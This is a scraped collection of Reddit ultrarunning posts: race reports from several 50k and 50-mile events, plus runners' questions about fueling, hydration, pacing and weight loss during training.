1) How should I think about fueling for longer races, i.e. 50-100 miles? I have run a handful of 50k's, and typically just fuel for those the same way I'd fuel for a marathon. Most things I read online suggest 150-200 cal/hr, but I imagine this was written with the ""average"" runner in mind (so more like 150lbs) and wondering if I should scale this per-hour figure up accordingly. Does this mean I should be aiming for more like 250-300 cal/hr? In training, I have been able to take in \~300-350 cal/hour on some 20+ mile training runs. I think I could probably get up to \~400 cal/hr intake but haven't tried it yet (didn't see a need). I also aim for 1L or so water per hour but curious if this should scale as well. 

2) What is the best way for me to lose weight? I think I might perform better at these longer distances if I could get down to \~180lb (I will never be one of the 150lb individuals). The problem is that I am currently running 60-70mpw and find that if I go with a sustained caloric deficit, my running performance starts to materially degrade (and thus I have to tradeoff between a deficit/weight loss and maintenance/consistent training). Is it best for me to just continue to train at my current weight? Take a few months of reduced volume to lose weight and then get back to higher volume training once I've hit my weight goal?

Eventually had to wait for someone to come along who had a watch that was working so we could find out way home. Is this acceptable? I have done unmarked races so have no issue with orienteering but was led to believe this a marked race. The race went into the night with multiple people getting lost in the woods. Am I being a wuss?
Other than this the race was amazing but left a bad taste in my mouth.",ultrarunning,1649712229

30k to 40 mile...,"Hi everyone. I'm toying with the idea of running a 40 mile race in September. I haven't done an ultra before, but in years past I've done several marathons (and an Ironman, and a dayhike of Mt. Whitney, etc). If I go through with this, I'd actually like to give a good showing...a sufferfest where I end up mid-pack would be disappointing.

I have a lot of experience with road races (2:35 marathon) and have a good understanding of how to translate training (and rune-up races) into road race performance, e.g., a half marathon in training was a good proxy for racing a marathon. I'm not running a LOT right now...probably about 40-45 mpw on average, but back in the day I would post training weeks in the 90-100 mile range.

Yesterday I ran a 30 km training run, \~80% on trail, with a similar (a bit easier) elevation profile. I was fairly satisfied with the pace, and I was certainly tired afterward but didn't feel destroyed by any means. I'm trying to figure out if it's reasonable to think I could hold that same pace for 40 miles in a race situation, or if strange, weird things happen to your body above marathon distance. There are a couple 50k races I could do in the next few months to investigate.

Would appreciate any insight you could share.",ultrarunning,1649706159

Apologies in advance for the length of this race report - this is my first time posting and I got carried away!

### Training &amp; Pre-race
This was my first ultra, and training started in November using a free plan found on the internet. I ran a couple of road marathons last year, so I had some consistent running behind me, however running off-road was an entirely new experience! Peak weekly mileage was 65, with several weeks in the 55-60 range. The longest training run was a solo 6:12 50K four weeks out from the race, which went well and left me feeling like I had a bit more left in the tank. I figured I would aim for the same pace up to 40 miles in the race, which would leave me plenty of time to walk it in if necessary.

Three weeks before the race, I started to notice a gentle ache in my calf which wasn’t entirely disappearing between runs. I didn’t think much of it until the next week, when I cut my last long run short after being unable to ignore my leg throbbing with every step. As I often do, I went from feeling quietly confident to verging on full panic mode - all I could picture was my leg giving out after a couple of miles and having an early DNF (or even a DNS). I initially thought it was an Achilles issue, then a soleus strain, but the pain spread further up my leg. I had a sports massage one week out from the race which didn’t seem to help much. The next day I tried a five mile run which ended up causing more problems - I committed to a full week off running and multiple stretching/foam rolling sessions each day. The final self-diagnosis I settled on was a sciatica flare-up, which I have had in a minor way before, so I concentrated on regularly stretching my piriformis and hamstrings. With a couple of days to go, I started to notice an improvement, although even the morning of the race I woke up with the familiar ache from my back down to my calf. Another stretching session first thing in the morning and then off to the start line.

### Race

Mile 0-7.5
We were very fortunate with the weather, which was cool, clear and sunny for the 8am start. After two weeks of full-blown anxiety, I felt quite calm as the race started and I got into a gentle pace. After all the worry, the leg pains faded away after the first 5-6 miles and didn’t return! Following some early navigation issues, I put my phone in the front of my backpack and kept the GPX open, rather than relying on the paper map provided. I hit the first checkpoint at 7.5 miles or so feeling good. 

Mile 7.5-15.8
Soon after the first checkpoint I started to move ahead of the pack of runners I’d started with, holding a pace around 11:30 a mile including walks uphill and when eating every thirty minutes. My main nutrition was Clif bars and gels, along with a PB&amp;J sandwich and banana, and all was going well at this point. I ran most of this section alone and went through the second checkpoint quickly. I hadn’t visited this part of England before and was surprised at how scenic the route was, which combined with the beautiful weather was keeping me in an upbeat mood.

Mile 15.8-23
Another section of good pace, following the plan. I passed a handful of runners through this part, although I was careful not to get carried away and speed up. I can’t remember a great deal about these miles apart from thinking that the first few hours had gone by surprisingly easily.

Mile 23-30
This was the part of the race where I realised I was running an ultra! I left the checkpoint to a long uphill walk, with one runner far in front of me. I eventually overtook them a mile or so down the road, then we went back and forth as I started to notice that I was walking for longer intervals than I had been before. Things then seemed to start coming apart a lot more quickly than I had experienced in any of my longer training runs, and by the time I had reached the marathon distance I was suddenly struggling to eat anything at all. I decided to skip my half-hourly snack and arranged for my dad to meet me at the next checkpoint with a coke - that gave me something to dream about! I was still managing to run enough here that I reached the 30-mile checkpoint at slightly over 6 hours, not too far off my 12-minute mile target. However, I knew that I wouldn’t be able to keep that going for another two hours, so I gave up the idea of hitting 40 in 8 hours as planned. 

Mile 30-37.8
I dawdled for ten minutes waiting for my long-awaited fizzy drink to arrive. I tried eating but even putting a small sweet in my mouth turned my stomach. When my dad came with the coke, I guzzled it and got moving before I started to feel too sorry for myself. I was starting to become keenly aware that I hadn’t eaten for a while and was only feeling worse as time wore on. I fought the temptation to dwell on the 24 miles still to go, as it was starting to feel like an impossible task - first major ultra lesson, you can go from cruising to suffering in a few miles! I knew the sugary soda would buy me some time, but I felt listless as I trudged on, promising myself that I would walk a full mile before trying to run again. At around mile 33, the waves of nausea were becoming too intense to power through and I stopped at the edge of a field to gag and wretch. Two runners appeared behind me and stopped to check that I was ok. I will call one of them H, and running into him at my lowest point turned out to be the best thing that could have happened. H said he had tweaked his hip early in the race (I had in fact run past him 15 miles before) and was going to power walk it in. He told me to step in with them and then he was off, marching down the trail. I followed, struggling to keep up initially as both guys told me that I needed to start drinking and eating as soon as possible if I wanted to finish. Thanks to their persistence, I started to sip water, which I managed to keep down. Fighting the urge to stop and keeping up with their pace was without exaggeration one of the hardest things I have ever done. Amazingly, after thirty minutes I was still hanging in with them and I found I could eat a small bite of a bagel I had with me. Then, a bit more water and more bagel. Then more. Then I was encouraging them to jog a few downhill stretches. By the time we hit the checkpoint, I was ready to eat a banana and some sweets, which felt like a minor miracle.

Mile 37.8-45.3
This was a long stretch with the only sections of the course which were flat, industrial and completely uninspiring. Despite eating what I could, and backing off when I felt my stomach start to disagree, I noticed my legs and back becoming much more tight and sore, which I think was due to the large gap in calories from the earlier miles. I hung in there and stepped with H, as he regaled me with tips and advice from his many previous ultras. He was someone I think I would have found it hard to get along with in everyday life, but in the context of bringing me out of my self-pity and hopelessness in the face of so many more miles, I couldn’t have wished for a better companion. He constantly badgered me to eat, and did not sacrifice his own goals for my benefit - every gate we went through or stile we climbed, he was off as soon as he was through and didn’t look back, so I either had to catch up or fall behind. At one point I got in front of him on a path, and within a few seconds he was barking at me to pick up the pace. The runner who was with H when they picked me up dropped off during this period, and we wouldn’t see him again (although I was pleased to see that he did later finish)

Mile 45.3-Finish
The last 9 miles went on for a very long time. I pulled my hamstring running one section, but again pushed myself to keep up with H, who continued to be a force of nature and slog on, despite it being clear that he was suffering too by this point. I was still happily eating and drinking, but couldn’t get enough fuel in to make up for all the miles on my legs. We trudged along as darkness fell and the cold set in, H still telling me lessons learned from his hundreds and fifties over the years. Even though I think he was in more physical pain than I was at this point, I knew that he wouldn’t break his pace for anyone, nor would he have slowed down if he had been alone and had no-one to drive him on. It was inspirational to be around and I ploughed on to finish in just over 13 hours, slower than I’d expected but thankfully 30 minutes within the cut off!

### Post-race
Two days later and I still can’t comprehend the fact that I finished my first ultra. I have been out for a couple of walks since and feel somewhat loose today, with the only possible ‘injury’ being some knee pain around where I felt my hamstring pull towards the end of the race. I haven’t slept very well, but I have been eating everything in sight and generally feeling very good about the world. This community has been a great, inexhaustible wealth of information and support, even for someone like me who reads but doesn’t post. I will finish with a few takeaways from my experience, for all the other nervous first-timers like me:

- Easy miles: it comes up a lot on this Reddit, but key for me when transitioning to ultras was dropping my ego and running slow and long in training. I racked up more miles than in a marathon block but with none of the injuries and niggles I would usually have to deal with.
- Don’t be afraid to rest: if I needed to miss a run, I did. I believed in my training and knew that an extra rest day here and there would allow me to run the longer distances each week. 
- Stretch! I left my stretching until it became a big problem in the weeks before the race. From here on, I will incorporate daily stretches into my routine to avoid all the problems that my tight muscles have caused me through my time running.
- There is a way back into the run when things aren’t going well. After 31/32 miles I started to think I might not finish. I was sick and starting to become overwhelmed with the distance remaining. I couldn’t have envisaged that I’d still be running in ten miles time and eating too! There is so much time to come back in an ultra, if you can find a way to grind out the worst of the lows. Which leaves me with…
- There are some wonderful people in ultrarunning. As I’ve said above, this community has been an inspiration and unmatchable source of information and opinion. Now that I am ‘officially’ a member of the club, I hope to add to this. It goes without saying that you will also meet great people at events. As my saga shows, it only takes one act of reaching out to a runner in need to completely turn their day around - I hope to be the H to someone else in a future race.

"Race Report: Brazos Bend 50k: Me &amp; Julio (or where I learned that something was wrong with me), my first 50K"," Race Information

* **Name:** Brazos Bend 50
* **Date:** April 9, 2022
* **Distance:** 50k

This was my first 50k. 6'2, 190(ish)lb. Husband and dad. I work full time. I've always been interested in getting into ultra distances (does 50k count?), so my wife encouraged me to go ahead and register. As I was looking for events, I saw that this was pretty much in my backyard. I didn't have any legitimate goals, but I knew I'd be pretty happy if I could finish sub-5. This is a pretty lengthy report- sorry!

**Training**

I signed up for this race on 3/11, which left me a little bit less than a month to do any sort of race specific training. I ran a marathon in January, and launched into a structured routine afterwards to try and keep my miles up. Nothing crazy- probably 35ish mpw and no long runs over 15miles. After registering, I ended up buying some trail shoes and made an effort to get off the road. I took an entire week off in March to just take a break. A couple of quick training notes: My longest run after I registered was 17miles. My weekly miles from Feb 1 through race day: 37, 35, 35, 25, 32, 7, 31, 26, 55, 27, taper and race. I took a couple days off at one point to deal with some calf tightness- but otherwise, no injuries or setbacks.

Obviously more miles would have been nice, but I still had plenty of fitness from marathon training to carry me through. I do wish that I could have spent a little more time on the trails. All in all though, I was happy with where I was at fitness-wise.

**Pre-Race**

I took off work a little early on Friday afternoon to get down to the park for packet pickup. I'd never been to the park before, so i wanted to get some idea of where I was going, where to park, etc. For dinner that night, we had some take-out Vietnamese- I think I got a vermicelli bowl that had a great mix of veggies and pork. Before bed, I got all my things loaded up and laid out, and then turned in for a good full night of sleep.

I woke up at 4:30 to give myself time to get moving around and take care of all my business (including a shower!). Breakfast was some yogurt and granola, two slices of peanut butter banana toast, and a big cup of coffee. At 5:15, I headed out and arrived at the park around 6AM. When I got there, the main lot was already full, so they were waving people into a satellite lot to be shuttled in. I parked, put on my shoes, and hopped in the shuttle.

I had about 40 minutes or so to kill by the time we got to the starting line. Lots of local clubs had put up tents, and there were groups or runners, friends, and families just chilling. It was pretty cool in the morning (45F), so I put on a long sleeve shirt and meandered around, enjoying the sunrise. At 6:45AM the director did a quick race brief and told people not to jump over alligators. OK- that shouldn't be a problem. 5 minutes from race time, I took a gel, filled up my handheld, and made sure I was carrying enough gels for the first loop.

**Race**

For last week or so, I tried coming up with a race plan and nothing really stuck. All I knew was that it was my first 50k, that I didn't want to go out too fast, and that I was loosely hoping to finish somewhere between 5-5:30, but frankly- I had no idea what to expect.

A couple of minutes before the start, I wandered over to the line and situated myself towards the middle of the pack of around 175ish runners, and got the watch ready to go. People all around me seemed to be much more relaxed that I've ever experienced in road-races, which was really nice. At 7AM, the director blew the starting horn and we all set off. My original plan was to pace myself on other runners, and then just adjust as the race went on. About 2 minutes into the run, I realized that the crowd was moving much slower than I was comfortable with and I quickly abandoned that plan and pushed towards the front of the group.

This is probably a good time to describe the course. The event is actually multiple races, including a 100k, 50m, 50k, 25k, and i think a 10k/5k. The 50m/100k folks started an hour before us. Everyone pretty much runs the same 15mile loop, except for the 50m folks who have one added section. The entire course is super flat- my watch only logged 47 total feet of ascent per loop. The first half of the loops sends you out over dirt and gravel paths around a few lakes with some mixed shade, beautiful scenery, and plenty of wildlife. There is a short out-and-back section near the start, which was really the only time you got to see the people who were racing competitively. At about 7miles, the course swings you back close to the start/finish line, before sending you out to the other side of the park for a very long, very straight out-and-back through the woods over a dirt road with some loose gravel. There isn't much to see during this section except for trees and vegetation, and of course hundreds of suffering runners. The trees overhead provided shade in the morning, but there wasn't enough coverage overage to keep the heat off of you once the sun got high enough. This section ends at the finish line, and for the 50K + folks, you repeat the loop. There were aid stations every 5 miles or so, well stocked with water, gatorade, pickle juice, gels, and plenty of food options.

OK- back to the race. So after deciding to set a more comfortable pace and pushing towards the front a little bit, I settled in around a 9minute mile. The crazies had rushed off at the start of the race and immediately separated from the rest of the field. After 5 or so minutes, I looked around and found that there were probably 15-20 of us that separated from the rest of the remaining group. As we approached that first turn around, I caught a glimpse of the fast folks- they were absolutely screaming down the path. The guy who won ended up finishing in 3:19...

About a 1.5 miles in, I saw that I had been running right behind the same guy for a while so I introduced myself and asked if I could run with him since we seemed to be going the same pace. This was EASILY the smartest thing i did. His name was Julio and he was a badass ultra vet. I literally spent the next 5 hours just chatting with Julio, talking about running and life. He was great company.

The first 6 miles went by very smoothly. We were keeping about 8:55-9 minute pace, the weather was cool, and the course was beautiful. We blew threw the first couple of aid stations without stopping, and made the turn into the wooded out-and-back. At this point, there were plenty of runners from the 50mile and 100k who were running back down the road towards us from the turn around. I was also starting to notice that loose gravel really sucks underfoot. This was one of those roads that was packed dirt where car tires would go, and the middle of the road had some vegetation and random rocks and pebbles, etc. I was on Julio's left side, which put me in the middle of the road- running over the rocks. It didn't bother me too much in the first loop, but I could tell that it was going to be annoying later on. We made it to the turn around, didn't stop at the aid station, and started the 4 miles or so back towards the finish line to start the second loop. This entire loop, my legs felt fresh, and we hit consistent 9min/miles. I don't remember when, but at some point in the second half of the first loop I realized that I forgotten to take any gels or fuel, so I managed to get two down in the last 7or so miles of that first loop. I went through 16 oz over the first 15 miles, which is less than I normally do but it was cool out and we were running easy.

As we approached the start/finish line, I told Julio that I was going to take a quick pit stop and that I'd try and catch up with him. I hit the restroom, refilled on gels, ditched my shirt, and topped off my handheld before getting back on course and settling in. I felt like I was quick in getting back on course, and briefly thought I had left without Julio. Luckily, I saw him during the short out-and-back portion of the first loop, and he was about 3-4 minutes or so ahead of me. I quickly decided that it was worth the effort to catch up to him, so I picked up the pace for a bit and eventually ran him down about 4 miles into the second loop.

This is where things started to finally get a little interesting. Just before catching up to Julio, I made my first stop at an aid station. I refilled on water and grabbed a cup of what I thought was orange Gatorade, threw it back, and asked one of the volunteers why they were serving carbonated Gatorade. She laughed at me an pointed to a 2L bottle of Sunkist. Whoops! I think this bothered me more mentally than it upset my stomach, luckily.

As soon as I finally caught up to Julio near mile 20, I immediately wondered if I just over-did it, as I was starting to feel some fatigue for the first time (and my stomach was still trying to decide how it felt about the Sunkist). Julio and I eventually set off into the woods for the second half of the second loop. By now, it's was about 10AM, the sun was out, and the temps were creeping into the 80s with some lingering morning humidity. Both Julio and I were definitely starting to feel the weather. Also , as we were running down the road through the woods, I could feel every single rock I stepped on and it almost felt like I was running barefoot. I distracted myself by watching other runners who are coming back down the road opposite our direction, and trying to figure out what distance they are running. No one is looking particularly good at this point, and I think I can count on 1 hand the number of people we saw that were actually running more than a few steps at a time.

We finally backed off our 9 minute pace a bit at mile 23 (or at least, that's what my watch said but it was definitely off at this point), and incorporated some short walking intervals. I think I was dealing with the weather a little better than Julio, but I was very happy to catch a few walking breaks. We eventually made it to the turn around and started to plod back up the road. Our mile splits had slowed to 11-12minutes, and I started to do some math in my head to try and figure out if we were going to make it through in under 5 hours. When my watched ticked off 26.3, I made the obligatory ""well this is officially the longest I've ever run"" comment. I think Julio was really starting to struggle with the heat at this point, and he told me to take off if I wanted to. I told him I was going to stick with him at least through mile 28, which would hopefully leave me enough time to power through the last few miles to get in under my target time. At 28 miles, I wished Julio best of luck and told him I'd catch him at the finish, and I took off at what I was sure was a blistering pace, sure to dazzle the remaining suffering runners and finish line spectators. It turns out I was not actually going very fast at all, and my GPS was so off at this point that I really only had 1.5 miles to go- not the 3 miles I was planning for. I guess that just goes to show how confused I was about where we were on the course.

Anyways, I tried my best to look normal for the photographer at the finish line and I cruised through at 4:46:30 and 19th total overall. I collected my medal (its actually wood!), grabbed a water and some oranges, and turned around just in time to see Julio making the turn towards the finish. I raised both fists and yelled ""JULIOOOOOOO!!!"" as loudly as I could as he ran in to the finish, ensuring that as many people as possible could cheer him by name as he crossed the finish line.

The second loop was really something different than anything I've experienced before, but for the most part, I actually thought it went pretty well. I didn't hit any sort of wall like I've experienced before in a couple of my road marathons. My legs felt fatigued, but never painful. We weren't going fast enough to be out of breath. The weather was pretty rough, but nothing out of the ordinary for me. I took 3 gels over the course of the second loop, and I think I went through 3 full water bottles (16oz each). Other than the sunkist incident, I didn't mess with the aid stations very much. Hands down, the worst part of this loop was the rocks in that out-and-back. I don't blame my shoes so much- but I'm sure a rock plate would have helped.

**Post-Race**

I chatted with Julio a bit and wished him luck for his next races before he hopped in the shuttle and took off. I called my wife, who said she got stuck at the stable (she works with horses) and hadn't left yet- she was planning on meeting me at the finish with our daughter. I had originally told her I was going to probably finish around noon-12:30, and I actually finished much faster than I had anticipated, so we made plans to just meet for lunch. I'd packed some baby wipes, so I cleaned up a bit in the camp-site restroom, put some clean clothes on, packed up, and started heading out. I started to walk down the road to where I thought my car was, and i made it about a 1/4 mile before I quickly decided I was not, in fact, feeling as fresh as I thought- and I turned back around to hop on the shuttle. I made it back to my car, where I had packed some milk and a box of frosted flakes, set up my camp chair, and spent the next 15 minutes sitting in the shade of my trunk enjoying a delicious bowl of the most glorious sugar cereal known to man. The rest of the day went well, involved lots of beer, water, and Masters coverage. I actually felt like I got around just fine on saturday and sunday- much better than I usually have after road marathons.

**Thoughts**

1. I can't believe i'm saying this, but that was actually fun. Eventually, I can see myself signing up for 50m or 100k race. I'm beginning to come to grips with the fact that something is indeed wrong with me.
2. I am a road runner. I'm used to going moderately fast on flat and dry concrete. Running on trails was sooo much nicer on my legs. Also, I'm super glad I bought some trail shoes for that race. It wasn't technical at all, but portions of that course would have completely torn up my road shoes.
3. I turned auto-lap on my watch off, and planned on manually lapping at each aid station to get a feel for our general pacing. I forgot to lap at pretty much every aid station. Oh well! At least my watch wasn't beeping at me every 9 minutes. Also on the topic of watches, you just can't trust the GPS distance after a while. I really wish I had paid more attention to course the first time around so I wasn't relying on my watch for distance as we got to the finish. My watch showed a finishing distance of 29.8 miles, which really threw me off at the end.
4. I'm a little concerned at how easy it was to forget to fuel. I think I got lost in conversation and didn't think about it until I was well past my planned fuel time. It turned out just fine, I didn't bonk at all. But I'll need to approach that a little differently next time, probably.
5. I've never listened to music while I run. If i do another ultra though, I'm going to probably get a music watch and pack some head phones for those later miles. If I hadn't been running with someone to talk to, I really don't think I would have kept it together mentally. Having something to keep my mind busy was probably the most important part of this event for me, from a running perspective.

anyways, if you made it this far- thanks for reading! If you've ever thought about running a 50k, I hope this helps a little bit. It was a blast- 10/10 would do again.",ultrarunning,1649696798
Running slower than expected causing more issues,"For my last 2 50 mile races I've ended up running with friends rather than doing what comes naturally. Obviously I'm on my feet for a little longer (90-120 mins) which will have an affect but I still find a struggle earlier in the race and especially post-race where it takes me 2-3 days before I can walk properly whereas if I run at a more natural pace I'm normally able to do a run the next day (not wise but the point being that I'm not really sore after).

Should slowing down by ~1min/mile in pace really make things feel worse?

50 miles solo - ~8:30-9:00 hrs
50 miles w/ friends - ~10:00-11:00 hrs

Should slowing down by ~1min/mile in pace really make things feel worse?

50 miles solo - ~8:30-9:00 hrs
50 miles w/ friends - ~10:00-11:00 hrs

Doesn't feel like it should be such a massive difference on my body. Only thing I can think of is that my stride is shorter and my muscles and joints aren't used to the smaller range of motion.",ultrarunning,1649691793

Race report: my first 50 miler. Success!,"Race name: Bull Run Run
Date: April 9, 2022
Distance: 50 miles
Location: Clifton, VA
Finish time: 12:43:xx 

Goals: 
Have fun, don’t die - yes 
Eat and drink enough, and don’t sh*t myself - yes, but it was close 
Finish - yes! 

Training:
Training was a bit of a mess. After recovering from Richmond marathon in early November, I was back into my regular casual running with the plan to ramp back up mileage in January. Some time in the end of December I slipped on ice and tweaked my ankle. Nothing major, but I made an appointment w a PT just in case, unfortunately she couldn’t see me until March(!) I took a week and a half off and was feeling pretty good so got back into it in early January. I’m still on track, no worries! I had a fantastic January/February and was feeling great. Then suddenly my right ankle and my right hip started feeling wonky. I could still run but not very fast, and it definitely just felt off. Luckily I still had that PT appointment coming up. She didn’t give me any groundbreaking info but the band exercises she gave me were very helpful. I was super diligent about those all month and didn’t run for 10 days. My first two runs back were very slow and short trail jogs with some walk breaks. At this point I was a little nervous about what kind of shape I was going to be in for race day but I kept my hopes up that I could still finish in time to make the cut-off of 13 hours. I also happily discovered that my hip felt better on trails than it did on pavement, so for the last month before race day I spent a lot more time on trails than I would have if I were feeling 100%. I didn’t get to cover a lot of miles but I was definitely practicing my patience. I was also able to up my strength training routine while running less, which helped a lot both mentally and physically. 

Mileage was obviously terrible in March. I totaled 89 miles. But I managed a couple of solid long runs (20 miler 2 weeks before race day, 12 miles with some good hills 1 week before). Overall I felt.. slow, but strong. As ready as I was going to be. 

February mileage: 167
January mileage: 150
Longest runs: 20 miles, 2x (once in February, once in March). 

Pre-race: 
Pre-race was also a bit of a mess (there’s a theme here). A couple weeks ago I got what I thought was an eye infection (it turned out to be a benign cyst). It swelled up quite a bit and affected my vision for a few days. Luckily the doctor didn’t have to do anything other than prescribe some steroid ointment, the swelling eventually came down. BUT no contacts on race day (very sad news for me). 

It also poured all week, and BRR has some notoriously muddy sections. Everyday that it rained I just pictured the swamp growing. I really havent done too many trail runs in muddy conditions, so this would be new territory. 

Then, two days before the big day, my 4 year old came down with a fever. He never gets sick (in fact, the last time he was sick was the day before I ran my first ever ultra in spring of 2020). The timing was awful. My in-laws were heading up to give us a hand over the weekend so I did covid tests and luckily everyone was negative. And then of course I started feeling some sinus pressure and congestion the day before. Day before race day I had chicken soup and rice for 2 meals, and tons of fluids. So far no fever on my end and the sinus pressure and congestion seemed to be held at bay. I did a quick shake out run on the tread on Friday afternoon. 

Race day: 
After a soggy week, we had pretty perfect temps. High 40s, mid 50s. Some sun, clouds and a couple spots of rain. I had my usual peanut butter toast and coffee for breakfast, and my friend Kandi and I carpooled down to the race, which would start at 6:30. 

Section 1: There Will Be Mud
They had a high water contingency route, which would only take us through the muddy section once instead of twice. The new route was about 47.5 miles, and I think quite a bit hillier. We were in the muddy section for the first few hours. It wasn’t as bad as I thought it would be, but it definitely made the flat easier part of the course more of a slog. Our feet were pretty soaked after a few stream crossings within the first hour as well. 

Section 2: I Thought There Would Be More Running on This Trail Run

The uphill hiking DEAR LORD. Some of the hills felt like they weren’t going to end. I could definitely feel my lack of training here. I made a mental note to train more hills next time. Just give me all the hills to train. My heart rate was spiking on my walks up the hills and then coming down on the flat runs. But K and I were still together and making pretty good time nonetheless. We were going about 4.5mph and slowly losing speed as the hillier sections were towards the second half. We hit the “soft cut-off” times at the earlier aid stations with lots of time to spare so I was pretty confident, even started thinking we would make it in 12 hours. 

Section 3: Consider My Bubble Burst

We lost a lot of time in the hilly section. Miles 25-35ish were borderline soul crushing. We hit our drop bags, contemplated changing shoes and decided against it. I also had a power bank in my drop bag for my watch but didn’t think I needed it. I turned out to be wrong. My watch crapped out at 8 hours (which is way earlier than it should have been, I may be contacting garmin later). Luckily K and I were still together and hers was still going. We were looping back to the same aid station in 10ish miles, and this was the longest 10 miles ever. There is a short loop that is known as one of the harder loops. We hiked most of it. I tried to muster up some more running once we were out of that section but it was tough. When we got back, I grabbed my power bank and changed socks and shoes as my toes were starting to blister. Now we were only 30 min ahead of the soft cut off time. I don’t remember much from here to the next aid station except that I had a gel before I realized the aid was right up ahead, and the gel plus extra snacks gave me some problems that I had to solve off trail. 

Section 4: I Can Do This All Day
We got to the last aid station about 5.5 miles from the finish line. It was 6pm and we had to be done at 7:30. We had been going about 3mph. Granted it was through the hardest part of the course, but now I’m starting to think we might not make the cut off. I solemnly swore to myself that any flat runnable section in the next 5.5 miles I was going to run (or shuffle, whatever). Shortly after that aid station is 1.5ish miles of FLAT. Funnily enough, we ran through it on the way out a few hours back and I felt like I was kind of struggling at that point. Not this time. I was getting home goddamit. I Forrest Gumped the whole stretch and we covered the 1.5 in about 15 min (my watch was back on at this point). The rest of the hills here were babies compared to what we had just done so we were finally able to make up some time. After a few miles and some really good running, my watch died AGAIN as did K’s. Luckily we passed a wonderful stranger who said he had on good authority that we had about 1.5 miles to the finish. I checked the time on my phone. It’s 6:45. We got this, we’re safe. I’m still running all the runnable paths. I’m aware my body hurts but I don’t care. There are a few rocky areas to walk through and one more monster hill at the very end. It’s golden hour now, the sun is setting, it’s a pretty lovely thing to see if we weren’t also having our hamstrings totally crushed one last time. Once we crest the hill, I can’t see or hear the finish yet but I know it’s pretty close. I’m running again. My brain tells my legs to go and they just go. Once I can see the finish they go faster. I’ve never wanted to be done with something so much in my entire life, including gestating and birthing two babies. I “sprinted” through the finish line (probably at a whopping 4mph). 12:43 and some seconds, I forget exactly. 17 min to spare. 

Post-race:
I had a hot dog and a cookie at the finish line but couldn’t eat more than that. My husband and his dad came to get us so he could drive my car back. It’s only about 45 min from home but that drive would have sucked. I was worried about what chafing I would find in the shower but surprisingly I only had a little bra line chafing and a few toe blisters. I took some Tylenol PM and was asleep by 9. I woke up at 4:30 this morning and could not sleep another wink until I ate a sandwich. My feet, hips, knees and butt hurt the most, in that order. I plan to eat a lot today. This was the hardest thing I’ve ever done and I can’t wait to do it again. 

Final Random Thoughts:
I played music for the last few hours and I was super nerding out about my playlist. I ran to movie scores for a couple hours. Some Marvel movies, some hanz zimmer, the hunger games, a few others. It really helped take me out of my head when I needed it. I also had a non-movie score playlist which started out w some chill music and worked it’s way up to some “yelling at me” music in the form of hip hop and heavy metal. I’m really proud of myself. 

I hear a lot of people say the mind gives out before the body and now I think I know what that means. I was in pretty good spirits for almost the whole race. Obviously having a friend w me the whole time and having nice weather played large parts in that. But there were definitely times when I could feel my lack of experience and training, any amount of doubt or negative thinking would have led to not finishing. 

I’d definitely like to do this race again, properly trained on hills next time. Course support was fantastic and everyone involved from runners, to RD, to volunteers, was just top notch.",ultrarunning,1649587388

Am I ready for 55k run?,"Hi All,

nOOb ultra runner here. I have my first 55k ultra with ~1500m of elevation coming up in 5 weeks.

I have been ramping up the mileage from 45km a week to ~80km a week (50mi) for the last four/ five weeks.
Weekly elevation around 1500m. 
My long runs have been between 27km and 32 km (20mi), with one marathon distance a month and a half ago which caused some shin issues that took me out for a week, now all good.

I have been practicing nutrition and hydration.

"Race Report - Rockin K 50k, KS","Short summary - trails are way harder than the road, but wow this race is fun!

Longer story - I ended up completing my first ultra distance in November last year with 50k in a 6hr race, and decided to follow on with a trail race this Spring. Having seen the Rockin K 50k on the Kansas Ultra running Society website and a cool video on YouTube I decided to give it a go.

Training was a bit ad hoc. Was feeling a bit fed up of scheduled plans, so went for the simple rough idea of long run Saturday, at least 2 miles further than the week before, plus a medium Sunday (ideally on the local trails, which are flat), plus junk miles through the week to get into the 40s, again increasing as time went on. This was disrupted with illness, 2 weeks of faux COVID, 2 weeks off-site with work and lots of cold snaps, but I did build up to a peak week of 46 miles with a 18 miler about 3 weeks prior to race. I really lacked trails though, even the local park with lots of singletrack ended up getting skipped due to weather, daylight and general laziness.

I camped in Kanopolis state Park the night prior and slept poorly due to someone playing music till 2am, but then also continually waking up to make sure I hadn't missed my alarm. Breakfast was peanut butter sandwich and a cold brew coffee, as I didn't want to bother taking a stove.

Got to the shelter to start at about 0610 and slowly stripped down to what I planned to wear. Temps in the mid 30s, so it was cool, but forecast was beautiful.

Race start was 0700, and the first section of about 13 miles was perfection. I tagged on the back of a group doing mid 9s once we left the road onto singletrack as we ran through sandstone canyons, then up onto the tops of the hills. As the distance built up everyone broke apart, and I mostly ran alone. Had 2 brief stops to take off a layer, and then refill at an unmanned aid station before reaching the first manned aid station at 13.5 miles.

Here was where the going got tough, 2 times of the big bluff loop, about 5 miles long. This was much more elevation change, poorer trails and unsure footing. The first time round was tough, the second time was even worse, with 3 consecutive 17min+ miles before recovering into the 14s towards the end. One highlight was probably the beaver dam crossing, but my knees and hips really started to hurt here. Stopped to refill and grab some snacks each time past the aid station, the departed on the ""home stretch"".

The final stretch was about 8 miles on terrain more similar to part 1, but by this point there wasn't much left. Lots of run walk, becoming more walk-shuffle towards the end. I had figured if I could keep times below 15min/mile I would finish below 7hrs, but I didn't account for GPS error, so I crossed 31.5mi with time to spare, but unfortunately the finish line was 32.3 miles at 7:07. The deepest water crossing of the day was 2 miles from the finish, waist deep and about 40ft across, but despite being wet from about mile 5 onwards I had no blisters and minimal chafing. I did discover I had monstrous sunburn though, having forgetting the sun cream before starting. Total elevation per the GPS was about 3500ft (not bad for Kansas!)

Post race burger, soda and then 90 minutes drive home.

Overall had a fantastic time, but I certainly need some more practice on the hills. Aerobically I wasn't too bad, but knees and hips were not there, and I struggled even on mild downhills in the last 3rd. Would certainly recommend the race to anyone though, and the 21 mile and marathon options were very popular.",ultrarunning,1649114331

"For a 100k, how much of your nutrition is liquid?","Did my first 100k on the weekend and for the first 70k, 2/3 of my calories came from liquid and I was really great. Moving smooth and minimal leg pain considering. 
At about 70k I started to get some GI discomfort (maybe a 4-5/10) so I decided to switch to mostly food calories. It kept my stomach feeling descent but my legs shortly lately went from minimal pain to screaming and my pace slowed drastically. 

Never done a 100k before so just looking to pick your brains but 
1. Was this just straight up coincidence?
2. In longer distances, does your pain gradually get worse or does it go off a cliff like mine did?
3. I was having roughly 300calories and hour the whole race. Obviously when I switched to more solid food sources, fats/protein went up a bit and sugars went down(liquid was skratch and bars were larabars/clif bars)

Lastly, did I wimp out with that switch? Looking back, i imagine a 4-5 GI discomfort at 70k is inevitable and wondering if I should have just stuck with the primarily liquid plan.",ultrarunning,1649095635

